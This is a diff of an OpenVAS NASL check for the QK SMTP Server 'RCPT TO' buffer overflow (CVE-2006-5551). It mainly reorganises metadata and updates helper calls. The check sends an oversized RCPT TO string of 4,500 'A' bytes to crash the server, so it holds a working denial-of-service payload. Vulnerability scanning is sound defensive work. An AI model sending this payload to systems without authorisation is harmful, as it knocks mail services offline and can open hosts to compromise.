@@ -1,12 +1,12 @@
 # OpenVAS Vulnerability Test
-# $Id: qk_smtp_server_dos.nasl 9349 2018-04-06 07:02:25Z cfischer $
+# $Id: qk_smtp_server_dos.nasl 13003 2019-01-09 15:42:03Z cfischer $
 # Description: QK SMTP Server 'RCPT TO' buffer overflow vulnerability
 #
 # Authors:
-# Ferdy Riphagen 
+# Ferdy Riphagen
 #
 # Copyright:
-# Copyright (C) 2006 Ferdy Riphagen
+# Copyright (C) 2008 Ferdy Riphagen
 #
 # This program is free software; you can redistribute it and/or modify
 # it under the terms of the GNU General Public License version 2,
@@ -22,63 +22,57 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 #
 
-tag_summary = "The remote SMTP server is prone to a stack based overflow.
+if(description)
+{
+  script_oid("1.3.6.1.4.1.25623.1.0.2000201");
+  script_version("$Revision: 13003 $");
+  script_tag(name:"last_modification", value:"$Date: 2019-01-09 16:42:03 +0100 (Wed, 09 Jan 2019) $");
+  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
+  script_tag(name:"cvss_base", value:"7.5");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
+  script_cve_id("CVE-2006-5551");
+  script_bugtraq_id(20681);
+  script_name("QK SMTP Server 'RCPT TO' buffer overflow vulnerability");
+  script_category(ACT_DENIAL);
+  script_family("Gain a shell remotely");
+  script_copyright("This script is Copyright (C) 2008 Ferdy Riphagen");
+  script_dependencies("smtpserver_detect.nasl", "smtp_settings.nasl");
+  script_require_ports("Services/smtp", 25);
 
-Description :
+  script_xref(name:"URL", value:"http://www.securiteam.com/exploits/6P00O15H6U.html");
 
-QK SMTP Server is installed on the remote host.
-The application does not properly check it's boundaries for 
-user supplied input in the 'RCPT TO' field.
+  script_tag(name:"solution", value:"Upgrade to QK SMTP Server 3.1 beta or a newer release.");
 
-This results in a stack based overflow, where it's possible to
-crash the service or compromise the host.";
+  script_tag(name:"summary", value:"QK SMTP Server is installed on the remote host which is prone
+  to a stack based overflow.");
 
-tag_solution = "Upgrade to QK SMTP Server 3.1 beta or a newer release.";
+  script_tag(name:"insight", value:"The application does not properly check it's boundaries for
+  user supplied input in the 'RCPT TO' field.");
 
-if (description) {
- script_oid("1.3.6.1.4.1.25623.1.0.2000201"); 
- script_version("$Revision: 9349 $");
- script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:02:25 +0200 (Fri, 06 Apr 2018) $");
- script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
- script_tag(name:"cvss_base", value:"7.5");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
+  script_tag(name:"impact", value:"This results in a stack based overflow, where it's possible to
+  crash the service or compromise the host.");
 
- script_cve_id("CVE-2006-5551");
- script_bugtraq_id(20681);
-
- name = "QK SMTP Server 'RCPT TO' buffer overflow vulnerability";
- script_name(name);
-
- script_category(ACT_DENIAL);
   script_tag(name:"qod_type", value:"remote_vul");
- script_family("Gain a shell remotely");
- script_copyright("This script is Copyright (C) 2006 Ferdy Riphagen");
+  script_tag(name:"solution_type", value:"VendorFix");
 
- script_dependencies("smtpserver_detect.nasl", "smtp_settings.nasl");
- script_require_ports("Services/smtp", 25);
- script_tag(name : "solution" , value : tag_solution);
- script_tag(name : "summary" , value : tag_summary);
- script_xref(name : "URL" , value : "http://www.securiteam.com/exploits/6P00O15H6U.html");
- exit(0);
+  exit(0);
 }
 
 include("smtp_func.inc");
+include("misc_func.inc");
 
-port = get_kb_item("Services/smtp");
-if (!port) port = 25;
-if (!get_port_state(port)) exit(0);
-
-soc = open_sock_tcp(port); 
+port = get_smtp_port(default:25);
+soc = open_sock_tcp(port);
 if (!soc) exit(0);
 
 banner = smtp_recv_banner(socket:soc);
 if ("QK SMTP Server" >< banner) {
 
  # This works regardless of the results from smtp_settings.nasl.
- domain = get_kb_item("Settings/third_party_domain");
+ domain = get_3rdparty_domain();
  sender = get_kb_item("SMTP/headers/From");
  helo = string("EHLO ", domain, "\r\n");
- from = string("MAIL FROM: ", sender, "\r\n"); 
+ from = string("MAIL FROM: ", sender, "\r\n");
  bof = string("RCPT TO: ", crap(data:raw_string(0x41), length:4500), "@", domain, "\r\n");
 
  # First send the HELO
@@ -91,7 +85,7 @@ if ("QK SMTP Server" >< banner) {
  recv = recv(socket:soc, length:1024);
  if ("Address Okay" >!< recv) exit(0);
 
- # The overflow 
+ # The overflow
  send(socket:soc, data:bof);
  recv = recv(socket:soc, length:1024);
  if (soc) {
@@ -99,7 +93,6 @@ if ("QK SMTP Server" >< banner) {
   close(soc);
  }
 
- # try to re-open the connection and get some data from it.
  soc = open_sock_tcp(port);
  if (soc) {
   line = smtp_recv_line(socket:soc, code:"220");
